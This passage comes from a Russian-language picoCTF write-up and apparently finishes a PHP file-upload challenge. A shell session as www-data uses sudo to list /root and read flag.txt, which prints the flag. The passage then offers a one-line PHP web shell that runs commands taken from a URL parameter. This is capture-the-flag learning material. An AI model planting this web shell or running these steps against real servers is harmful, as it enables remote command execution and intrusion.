...
Осталось почти ничто:

```bash
www-data@challenge:…/html/uploads# sudo ls /root
flag.txt

www-data@challenge:…/html/uploads# sudo cat /root/flag.txt
picoCTF{wh47_c4n_u_d0_wPHP_16579372}
```


можно такой shell.php:
```php
<?php system($_GET['cmd']); ?>
```
